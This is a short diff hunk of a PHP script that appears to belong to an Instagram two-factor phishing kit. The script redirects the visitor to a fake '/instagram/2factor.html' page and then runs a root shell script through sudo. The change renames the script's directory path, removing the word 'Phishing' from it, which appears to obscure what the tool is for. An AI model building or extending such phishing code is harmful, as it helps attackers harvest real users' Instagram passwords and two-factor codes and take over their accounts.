@@ -13,5 +13,5 @@ header('Location: /instagram/2factor.html');
 ob_end_flush();
 ob_flush();
 flush();
-system("sudo /root/2FAInstagramPhishing/root.sh &");
+system("sudo /root/2FAInstagram/root.sh &");
 exit();
